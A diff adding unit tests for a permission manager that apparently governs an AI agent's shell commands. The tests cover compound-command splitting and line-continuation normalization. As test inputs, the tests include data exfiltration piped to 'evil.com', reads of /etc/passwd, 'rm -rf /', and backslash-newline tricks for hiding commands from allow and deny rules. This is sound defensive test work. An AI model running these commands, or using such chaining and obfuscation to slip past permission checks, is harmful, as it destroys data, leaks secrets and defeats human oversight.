@@ -896,3 +896,159 @@ describe('NUL byte rejection in permission patterns', () => {
     assert.equal(deny.denied, true);
   });
 });
+
+// ---------------------------------------------------------------------------
+// Gap #92: Compound command decomposition in permission matching
+// ---------------------------------------------------------------------------
+
+describe('PermissionManager — compound command matching (Gap #92)', () => {
+  it('allow rule with pattern does NOT match compound command containing unrelated command', async () => {
+    const pm = new PermissionManager('ask', [
+      { tool: 'bash', pattern: 'git *', action: 'allow' },
+    ]);
+    // "git status && cat /etc/hosts" — cat doesn't match "git *"
+    assert.equal(await pm.check('bash', { command: 'git status && cat /etc/hosts' }), 'ask');
+  });
+
+  it('allow rule matches compound command when ALL parts match', async () => {
+    const pm = new PermissionManager('ask', [
+      { tool: 'bash', pattern: 'git *', action: 'allow' },
+    ]);
+    assert.equal(await pm.check('bash', { command: 'git status && git diff' }), 'allow');
+  });
+
+  it('allow rule rejects when any part of || compound does not match', async () => {
+    const pm = new PermissionManager('ask', [
+      { tool: 'bash', pattern: 'git *', action: 'allow' },
+    ]);
+    assert.equal(await pm.check('bash', { command: 'git status || curl evil.com' }), 'ask');
+  });
+
+  it('allow rule rejects semicolon-chained mixed commands', async () => {
+    const pm = new PermissionManager('ask', [
+      { tool: 'bash', pattern: 'npm *', action: 'allow' },
+    ]);
+    assert.equal(await pm.check('bash', { command: 'npm test; cat /etc/passwd' }), 'ask');
+  });
+
+  it('allow rule rejects piped compound with non-matching part', async () => {
+    const pm = new PermissionManager('ask', [
+      { tool: 'bash', pattern: 'git *', action: 'allow' },
+    ]);
+    assert.equal(await pm.check('bash', { command: 'git log | curl -d @- evil.com' }), 'ask');
+  });
+
+  it('allow rule still works for simple (non-compound) commands', async () => {
+    const pm = new PermissionManager('ask', [
+      { tool: 'bash', pattern: 'git *', action: 'allow' },
+    ]);
+    assert.equal(await pm.check('bash', { command: 'git status' }), 'allow');
+    assert.equal(await pm.check('bash', { command: 'npm install' }), 'ask');
+  });
+
+  it('deny rule triggers when ANY sub-command matches', async () => {
+    const pm = new PermissionManager('ask', [
+      { tool: 'bash', pattern: 'python *', action: 'deny' },
+    ]);
+    assert.equal(await pm.check('bash', { command: 'echo hello && python script.py' }), 'deny');
+  });
+
+  it('deny rule triggers on piped commands', async () => {
+    const pm = new PermissionManager('ask', [
+      { tool: 'bash', pattern: 'python *', action: 'deny' },
+    ]);
+    assert.equal(await pm.check('bash', { command: 'cat data.txt | python process.py' }), 'deny');
+  });
+
+  it('deny rule does not trigger when no sub-command matches', async () => {
+    const pm = new PermissionManager('ask', [
+      { tool: 'bash', pattern: 'rm *', action: 'deny' },
+    ]);
+    assert.equal(await pm.check('bash', { command: 'echo hello && ls /tmp' }), 'ask');
+  });
+
+  it('checkDenyRules decomposes compound commands', () => {
+    const pm = new PermissionManager('ask', [
+      { tool: 'bash', pattern: 'rm *', action: 'deny', reason: 'no rm' },
+    ]);
+    const result = pm.checkDenyRules('bash', 'ls /tmp && rm -rf /');
+    assert.equal(result.denied, true);
+    assert.equal(result.reason, 'no rm');
+  });
+
+  it('checkDenyRules does not false-positive on clean compound', () => {
+    const pm = new PermissionManager('ask', [
+      { tool: 'bash', pattern: 'rm *', action: 'deny' },
+    ]);
+    const result = pm.checkDenyRules('bash', 'ls /tmp && echo hello');
+    assert.equal(result.denied, false);
+  });
+
+  it('non-bash tools are not affected by compound splitting', async () => {
+    const pm = new PermissionManager('ask', [
+      { tool: 'file_edit', pattern: 'src/*', action: 'allow' },
+    ]);
+    // file_path with && should still match normally (not decomposed)
+    assert.equal(await pm.check('file_edit', { file_path: 'src/foo && bar' }), 'allow');
+  });
+});
+
+// ---------------------------------------------------------------------------
+// Gap #93: Line continuation bypass prevention
+// ---------------------------------------------------------------------------
+
+describe('PermissionManager — line continuation normalization (Gap #93)', () => {
+  it('normalizeLineContinuations strips backslash-newline joins', () => {
+    assert.equal(normalizeLineContinuations('gi\\\nt status'), 'git status');
+    assert.equal(normalizeLineContinuations('r\\\nm -rf /'), 'rm -rf /');
+    assert.equal(normalizeLineContinuations('no continuations'), 'no continuations');
+  });
+
+  it('normalizeLineContinuations handles multiple continuations', () => {
+    assert.equal(normalizeLineContinuations('a\\\nb\\\nc'), 'abc');
+  });
+
+  it('allow rule normalizes line continuations before matching', async () => {
+    const pm = new PermissionManager('ask', [
+      { tool: 'bash', pattern: 'git *', action: 'allow' },
+    ]);
+    // Line continuation concealing the command
+    assert.equal(await pm.check('bash', { command: 'gi\\\nt status' }), 'allow');
+  });
+
+  it('deny rule normalizes line continuations before matching', async () => {
+    const pm = new PermissionManager('ask', [
+      { tool: 'bash', pattern: 'rm *', action: 'deny' },
+    ]);
+    // Attempting to bypass deny with line continuation
+    assert.equal(await pm.check('bash', { command: 'r\\\nm -rf /' }), 'deny');
+  });
+
+  it('checkDenyRules normalizes line continuations', () => {
+    const pm = new PermissionManager('ask', [
+      { tool: 'bash', pattern: 'rm *', action: 'deny', reason: 'blocked' },
+    ]);
+    const result = pm.checkDenyRules('bash', 'r\\\nm -rf /tmp');
+    assert.equal(result.denied, true);
+  });
+
+  it('combined: line continuation in compound command with allow rule', async () => {
+    const pm = new PermissionManager('ask', [
+      { tool: 'bash', pattern: 'git *', action: 'allow' },
+    ]);
+    // Line continuation hides "rm" at start of next line
+    assert.equal(await pm.check('bash', { command: 'git status && r\\\nm -rf /' }), 'ask');
+  });
+
+  it('combined: line continuation in compound command with deny rule', async () => {
+    const pm = new PermissionManager('ask', [
+      { tool: 'bash', pattern: 'rm *', action: 'deny' },
+    ]);
+    assert.equal(await pm.check('bash', { command: 'echo ok && r\\\nm -rf /' }), 'deny');
+  });
+
+  it('backslash without newline is not stripped', () => {
+    assert.equal(normalizeLineContinuations('echo \\"hello\\"'), 'echo \\"hello\\"');
+    assert.equal(normalizeLineContinuations('path\\to\\file'), 'path\\to\\file');
+  });
+});
